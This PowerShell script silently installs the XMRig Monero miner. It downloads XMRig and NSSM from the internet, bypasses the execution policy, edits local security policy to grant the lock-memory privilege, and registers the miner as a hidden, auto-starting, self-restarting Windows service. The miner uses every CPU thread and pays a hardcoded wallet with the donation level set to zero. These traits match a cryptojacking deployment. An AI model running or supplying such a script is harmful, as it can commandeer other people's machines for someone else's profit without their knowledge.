Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
$xmrigFolder = "C:\xmrig"
$serviceName = "XMRig_KonTum"
New-Item -ItemType Directory -Force -Path $xmrigFolder | Out-Null
$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
$zipPath = "$env:TEMP\xmrig.zip"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
Expand-Archive -Path $zipPath -DestinationPath $xmrigFolder -Force
$xmrigExe = Get-ChildItem -Path $xmrigFolder -Recurse -Filter "xmrig.exe" | Select-Object -First 1 -ExpandProperty FullName
$nssmZipUrl = "https://nssm.cc/ci/nssm-2.24-101-g897c7ad.zip"
$nssmZipPath = "$env:TEMP\nssm.zip"
Invoke-WebRequest -Uri $nssmZipUrl -OutFile $nssmZipPath -UseBasicParsing
Expand-Archive -Path $nssmZipPath -DestinationPath $xmrigFolder -Force
$nssmExe = Get-ChildItem -Path $xmrigFolder -Recurse -Filter "nssm.exe" | Where-Object { $_.DirectoryName -like "*win64*" } | Select-Object -First 1 -ExpandProperty FullName
$wallet = "87LVyXpW64PLompVtz6nYsULGAGckEv63CGW8euYg21VV7BB8sALsvadF1JK7E6g5VV71gJSXJcBrPEJjpjwhbX5HBUCc5s"
$worker = "x1"
$threads = (Get-CimInstance Win32_Processor).NumberOfLogicalProcessors
$appParams = "-o pool.hashvault.pro:443 " +
             "-u $wallet " +
             "-p $worker " +
             "--coin monero " +
             "--tls " +
             "--threads=$threads " +
             "--cpu-max-threads-hint=100 " +
             "--cpu-priority=5 " +
             "--randomx-mode=fast " +
             "--randomx-1gb-pages " +
             "--randomx-jit " +
             "--randomx-init=full " +
             "--donate-level=0 " +
             "--http-enabled --http-port=8080"
secedit /export /cfg "$env:TEMP\secpol.cfg" | Out-Null
(Get-Content "$env:TEMP\secpol.cfg") -replace 'SeLockMemoryPrivilege =.*', 'SeLockMemoryPrivilege = *S-1-5-18' | Set-Content "$env:TEMP\secpol_new.cfg"
secedit /configure /db secedit.sdb /cfg "$env:TEMP\secpol_new.cfg" /areas USER_RIGHTS | Out-Null
if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
    & $nssmExe stop $serviceName 2>$null
    & $nssmExe remove $serviceName confirm 2>$null
}
& $nssmExe install $serviceName $xmrigExe
& $nssmExe set $serviceName AppParameters $appParams
& $nssmExe set $serviceName AppDirectory $xmrigFolder
& $nssmExe set $serviceName AppNoConsole 1
& $nssmExe set $serviceName Start SERVICE_AUTO_START
& $nssmExe set $serviceName AppExit Default Restart
& $nssmExe start $serviceName
